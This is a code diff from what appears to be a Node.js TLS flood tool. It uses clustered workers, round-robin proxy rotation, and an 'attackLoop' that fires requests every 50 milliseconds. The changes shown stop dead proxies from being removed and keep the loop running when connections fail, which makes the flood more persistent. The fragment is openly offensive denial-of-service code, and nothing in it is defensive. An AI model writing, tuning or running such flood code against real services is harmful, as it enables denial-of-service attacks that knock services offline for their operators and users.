@@ -80,9 +80,9 @@ if (cluster.isMaster) {
         });
 
         client.on("error", (err) => {
-            console.error(`TLS connection error: ${err.message}`);
-            client.destroy();
-            callback(false);
+            console.warn(`Error with proxy ${proxy}: ${err.message}`);
+            // Do nothing here, just call the callback and continue
+            callback(false); // Move to the next proxy without affecting the TLS connection
         });
 
         client.on("close", () => {
@@ -96,18 +96,12 @@ if (cluster.isMaster) {
             process.exit(0);
         }
 
-        if (proxies.length === 0) {
-            console.error("No working proxies left. Exiting...");
-            process.exit(1);
-        }
-
         const proxy = proxies[proxyIndex];
         proxyIndex = (proxyIndex + 1) % proxies.length; // Round-robin proxy
 
         sendTLSRequest(proxy, (success) => {
             if (!success) {
-                console.warn(`Removing dead proxy: ${proxy}`);
-                proxies = proxies.filter(p => p !== proxy); // Remove dead proxy
+                console.warn(`Skipping proxy ${proxy} and moving to the next one.`);
             }
             setTimeout(attackLoop, 50); // Micro delay for more stable CPU usage
         });
